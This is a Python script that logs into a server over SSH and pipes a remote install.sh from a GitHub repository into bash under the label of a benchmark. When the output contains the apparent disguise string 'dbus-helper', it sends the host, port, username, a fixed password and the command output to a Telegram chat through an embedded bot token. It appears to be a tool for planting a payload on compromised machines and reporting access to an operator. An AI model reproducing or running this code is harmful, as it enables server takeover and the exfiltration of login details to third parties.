import paramiko
import time
import sys
import re
import requests

TOKEN = "8320646942:AAE35u3-Fxz9KEGa6RcbbcQ8gI0qZ5vs_O8"
CHAT_ID = "-1003822879502"
TOPIC_ID = 9

def send(msg):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {
        "chat_id": CHAT_ID,
        "message_thread_id": TOPIC_ID,
        "text": msg,
        "parse_mode": "Markdown"
    }
    requests.post(url, data=data)

ANSI_ESCAPE = re.compile(r'\x1B\[[0-?]*[ -/]*[@-~]')

def strip_color(text):
    # bỏ màu
    text = ANSI_ESCAPE.sub('', text)

    # bỏ dòng trang trí
    clean_lines = []
    for line in text.splitlines():
        s = line.strip()
        if s and all(c in "-=_*#" for c in s):
            continue
        clean_lines.append(line)
    while "  " in text:text = text.replace("  "," ")
    return "\n".join(text.splitlines()[3:]).replace("-","")


BENCH_CMD = "curl -Lso- https://raw.githubusercontent.com/catherine935/rmto238na/refs/heads/main/install.sh | bash"
TRIGGER_TEXT = "dbus-helper"

def run_bench(ip, port, user, password):
    print(f"\n[+] Connecting to {ip} ...")
    isVPS = False
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(
            hostname=ip,
            port=port,
            username=user,
            password=password,
            timeout=10,
            banner_timeout=10,
            auth_timeout=10
        )

        stdin, stdout, stderr = ssh.exec_command(BENCH_CMD, get_pty=True)

        output_buffer = ""

        for line in iter(stdout.readline, ""):
            output_buffer += line

            if TRIGGER_TEXT in line:
                print(f"[!] Detected bench.sh banner on {ip}")
                isVPS = True
        if isVPS :
            send(f"""
                 
```lua
------ VPS LOG ------
HOST     : {ip}
PORT     : {port}
USERNAME : {user}
PASSWORD : wtf@1112032
--------------------
```
Login: `ssh {user}@{ip} -p {port}`

by @nguynnv

```lua
{strip_color(output_buffer.strip()) }
```

""")

    except Exception as e:
        print(f"[X] {ip} failed: {e}")

def main():
    ip = sys.argv[1]
    port = sys.argv[2]
    user = sys.argv[3]
    password = sys.argv[4]    
    run_bench(ip,port,user,password)
if __name__ == "__main__":
    main()
